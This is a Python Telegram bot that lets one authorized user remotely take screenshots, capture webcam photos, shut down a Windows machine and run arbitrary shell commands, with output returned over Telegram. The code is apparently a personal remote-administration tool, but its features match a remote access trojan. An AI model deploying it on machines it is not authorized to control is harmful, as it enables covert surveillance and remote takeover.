import os
import platform
import psutil
import cv2
import subprocess
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes
from PIL import ImageGrab

TOKEN = 'YOUR_TOKENS'
AUTHORIZED_USER_ID = 1111111

def is_authorized(update: Update) -> bool:
    return update.effective_user.id == AUTHORIZED_USER_ID

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if is_authorized(update):
        await update.message.reply_text("Welcome! Use /help to see available commands.")
    else:
        await update.message.reply_text("You are not authorized to use this bot.")

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if is_authorized(update):
        commands = (
            "/start - Start the bot\n"
            "/help - Show available commands\n"
            "/status - Get system status\n"
            "/screenshot - Take a screenshot\n"
            "/camera - Take a photo from the camera\n"
            "/shutdown - Shut down the system\n"
            "/shell <command> - Execute a command in the shell\n"
        )
        await update.message.reply_text(commands)
    else:
        await update.message.reply_text("You are not authorized to use this bot.")

async def status(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if is_authorized(update):
        cpu_usage = psutil.cpu_percent(interval=1)
        mem = psutil.virtual_memory()
        disk = psutil.disk_usage('/')
        status_message = (
            f"CPU Usage: {cpu_usage}%\n"
            f"Memory Usage: {mem.percent}%\n"
            f"Disk Usage: {disk.percent}%"
        )
        await update.message.reply_text(status_message)
    else:
        await update.message.reply_text("You are not authorized to use this command.")

async def screenshot(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if is_authorized(update):
        temp_path = os.path.join(os.getenv('TEMP'), 'screenshot.png')
        try:
            screenshot = ImageGrab.grab()
            screenshot.save(temp_path, 'PNG')
            await context.bot.send_photo(chat_id=update.effective_chat.id, photo=open(temp_path, 'rb'))
        except Exception as e:
            await update.message.reply_text(f"Error taking screenshot: {e}")
        finally:
            if os.path.exists(temp_path):
                os.remove(temp_path)
    else:
        await update.message.reply_text("You are not authorized to use this command.")

async def shutdown(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if is_authorized(update):
        await update.message.reply_text("The system will shut down shortly.")
        os.system("shutdown /s /t 5")
    else:
        await update.message.reply_text("You are not authorized to use this command.")

async def camera(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if is_authorized(update):
        temp_photo_path = os.path.join(os.getenv('TEMP'), 'photo.png')
        try:
            cap = cv2.VideoCapture(0)
            ret, frame = cap.read()
            if ret:
                cv2.imwrite(temp_photo_path, frame)
                await context.bot.send_photo(chat_id=update.effective_chat.id, photo=open(temp_photo_path, 'rb'))
            else:
                await update.message.reply_text("Unable to access the camera.")
            cap.release()
        except Exception as e:
            await update.message.reply_text(f"An error occurred accessing the camera: {e}")
        finally:
            if os.path.exists(temp_photo_path):
                os.remove(temp_photo_path)
    else:
        await update.message.reply_text("You are not authorized to use this command.")

async def shell_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if is_authorized(update):
        command = ' '.join(context.args)
        if not command:
            await update.message.reply_text("Please provide a command to execute.")
            return
        try:
            output = subprocess.check_output(command, shell=True, text=True, stderr=subprocess.STDOUT)
            await update.message.reply_text(f"{output}")
        except subprocess.CalledProcessError as e:
            await update.message.reply_text(f"Error executing command:\n{e.output}")
    else:
        await update.message.reply_text("You are not authorized to use this command.")

def main() -> None:
    application = Application.builder().token(TOKEN).build()
    application.add_handler(CommandHandler('start', start))
    application.add_handler(CommandHandler('help', help_command))
    application.add_handler(CommandHandler('status', status))
    application.add_handler(CommandHandler('screenshot', screenshot))
    application.add_handler(CommandHandler('shutdown', shutdown))
    application.add_handler(CommandHandler('camera', camera))
    application.add_handler(CommandHandler('shell', shell_command))
    application.run_polling()

if __name__ == '__main__':
    main()
